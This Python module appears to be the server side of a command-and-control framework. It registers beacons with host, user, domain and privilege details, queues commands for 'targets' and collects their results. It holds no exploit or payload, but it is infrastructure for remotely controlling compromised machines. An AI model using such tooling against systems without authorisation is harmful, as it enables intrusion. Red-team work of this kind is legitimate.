"""
Server-side beacon management.

Handles beacon check-ins, task dispatch to beacons, and result collection.
Beacons poll the server for tasks and post results back.
"""
from __future__ import annotations

import asyncio
import uuid
from datetime import datetime, timezone
from typing import Optional

from sqlalchemy import select, update
from sqlalchemy.ext.asyncio import AsyncSession

from database.db import async_session
from database.models import Beacon, TaskRecord


class BeaconHandler:
    def __init__(self):
        # beacon_id -> asyncio.Event for task notification
        self._task_waiters: dict[str, asyncio.Event] = {}
        # beacon_id -> list of pending task dicts
        self._pending_tasks: dict[str, list[dict]] = {}
        # task_id -> asyncio.Future for result delivery
        self._result_futures: dict[str, asyncio.Future] = {}

    async def register_beacon(self, info: dict) -> dict:
        """Register a new beacon check-in."""
        async with async_session() as db:
            beacon = Beacon(
                id=info.get("beacon_id", str(uuid.uuid4())),
                hostname=info.get("hostname", "unknown"),
                ip_address=info.get("ip_address", "0.0.0.0"),
                os=info.get("os", "Unknown"),
                username=info.get("username", ""),
                domain=info.get("domain", ""),
                pid=info.get("pid", 0),
                process_name=info.get("process_name", ""),
                integrity=info.get("integrity", "medium"),
                status="active",
                last_seen=datetime.now(timezone.utc),
                metadata_=info.get("metadata", {}),
            )
            # Upsert: check if beacon already exists
            existing = await db.get(Beacon, beacon.id)
            if existing:
                existing.hostname = beacon.hostname
                existing.ip_address = beacon.ip_address
                existing.os = beacon.os
                existing.username = beacon.username
                existing.domain = beacon.domain
                existing.pid = beacon.pid
                existing.process_name = beacon.process_name
                existing.integrity = beacon.integrity
                existing.status = "active"
                existing.last_seen = datetime.now(timezone.utc)
            else:
                db.add(beacon)
            await db.commit()

        self._pending_tasks.setdefault(beacon.id, [])
        self._task_waiters.setdefault(beacon.id, asyncio.Event())

        return {"beacon_id": beacon.id, "status": "registered"}

    async def beacon_checkin(self, beacon_id: str) -> dict:
        """Beacon checks in — update last_seen and return pending tasks."""
        async with async_session() as db:
            beacon = await db.get(Beacon, beacon_id)
            if not beacon:
                return {"error": "unknown beacon", "rejected": True, "tasks": []}
            beacon.last_seen = datetime.now(timezone.utc)
            beacon.status = "active"
            await db.commit()

        # Return any pending tasks for this beacon
        tasks = self._pending_tasks.get(beacon_id, [])
        self._pending_tasks[beacon_id] = []
        return {"beacon_id": beacon_id, "tasks": tasks}

    async def submit_task(self, beacon_id: str, task_id: str, action: str,
                          params: dict, timeout: float = 300) -> dict:
        """
        Submit a task to a beacon and wait for the result.
        Called by agents to send commands to targets.
        """
        task_payload = {
            "task_id": task_id,
            "action": action,
            "params": params,
        }

        # Queue the task for the beacon
        self._pending_tasks.setdefault(beacon_id, [])
        self._pending_tasks[beacon_id].append(task_payload)

        # Notify the beacon waiter if it's long-polling
        waiter = self._task_waiters.get(beacon_id)
        if waiter:
            waiter.set()

        # Create a future to wait for the result
        loop = asyncio.get_event_loop()
        future = loop.create_future()
        self._result_futures[task_id] = future

        try:
            result = await asyncio.wait_for(future, timeout=timeout)
            return result
        except asyncio.TimeoutError:
            self._result_futures.pop(task_id, None)
            return {"task_id": task_id, "status": "timeout", "error": "Beacon did not respond in time"}

    async def submit_result(self, beacon_id: str, task_id: str, result: dict) -> dict:
        """Beacon posts back a task result."""
        async with async_session() as db:
            # Update task record
            task_record = await db.get(TaskRecord, task_id)
            if task_record:
                task_record.status = result.get("status", "completed")
                task_record.result = result.get("data", {})
                task_record.error = result.get("error")
                task_record.completed_at = datetime.now(timezone.utc)

            # Refresh beacon last_seen — posting a result proves the beacon is alive
            beacon = await db.get(Beacon, beacon_id)
            if beacon:
                beacon.last_seen = datetime.now(timezone.utc)
                beacon.status = "active"

            await db.commit()

        # Resolve the waiting future
        future = self._result_futures.pop(task_id, None)
        if future and not future.done():
            future.set_result(result)

        return {"task_id": task_id, "accepted": True}

    async def wait_for_tasks(self, beacon_id: str, timeout: float = 30) -> list[dict]:
        """Long-poll: beacon waits for new tasks.
        The long-poll itself counts as a check-in (beacon is alive and waiting).
        """
        # Refresh last_seen — the beacon is actively polling
        async with async_session() as db:
            beacon = await db.get(Beacon, beacon_id)
            if beacon:
                beacon.last_seen = datetime.now(timezone.utc)
                beacon.status = "active"
                await db.commit()

        waiter = self._task_waiters.setdefault(beacon_id, asyncio.Event())
        waiter.clear()

        # If there are already pending tasks, return immediately
        pending = self._pending_tasks.get(beacon_id, [])
        if pending:
            self._pending_tasks[beacon_id] = []
            return pending

        # Wait for new tasks or timeout
        try:
            await asyncio.wait_for(waiter.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            pass

        tasks = self._pending_tasks.get(beacon_id, [])
        self._pending_tasks[beacon_id] = []
        return tasks

    def _compute_staleness(self, last_seen: Optional[datetime]) -> str:
        """Return status based on how long since last check-in.

        Thresholds are generous because beacons may be busy executing
        tasks during long-poll + execution cycles.
        """
        if not last_seen:
            return "dead"
        now = datetime.now(timezone.utc)
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)
        elapsed = (now - last_seen).total_seconds()
        if elapsed < 120:
            return "active"
        if elapsed < 600:
            return "dormant"
        return "dead"

    async def list_beacons(self) -> list[dict]:
        """List all registered beacons with staleness detection."""
        async with async_session() as db:
            result = await db.execute(select(Beacon).order_by(Beacon.last_seen.desc()))
            beacons = result.scalars().all()
            out = []
            for b in beacons:
                status = self._compute_staleness(b.last_seen)
                # Update DB if status changed
                if b.status != "deleted" and b.status != status:
                    b.status = status
                    await db.commit()
                out.append({
                    "id": b.id,
                    "hostname": b.hostname,
                    "ip_address": b.ip_address,
                    "os": b.os,
                    "username": b.username,
                    "domain": b.domain,
                    "pid": b.pid,
                    "process_name": b.process_name,
                    "integrity": b.integrity,
                    "status": b.status,
                    "last_seen": b.last_seen.isoformat() if b.last_seen else None,
                    "registered_at": b.registered_at.isoformat() if b.registered_at else None,
                })
            return out

    async def delete_beacon(self, beacon_id: str) -> dict:
        """Delete a beacon. It will be rejected on next check-in."""
        async with async_session() as db:
            beacon = await db.get(Beacon, beacon_id)
            if not beacon:
                return {"deleted": False, "error": "not found"}
            await db.delete(beacon)
            await db.commit()
        # Clean up in-memory state
        self._pending_tasks.pop(beacon_id, None)
        self._task_waiters.pop(beacon_id, None)
        return {"deleted": True, "beacon_id": beacon_id}

    async def get_beacon(self, beacon_id: str) -> Optional[dict]:
        async with async_session() as db:
            b = await db.get(Beacon, beacon_id)
            if not b:
                return None
            return {
                "id": b.id,
                "hostname": b.hostname,
                "ip_address": b.ip_address,
                "os": b.os,
                "username": b.username,
                "domain": b.domain,
                "pid": b.pid,
                "process_name": b.process_name,
                "integrity": b.integrity,
                "status": b.status,
                "last_seen": b.last_seen.isoformat() if b.last_seen else None,
            }


# Singleton
beacon_handler = BeaconHandler()
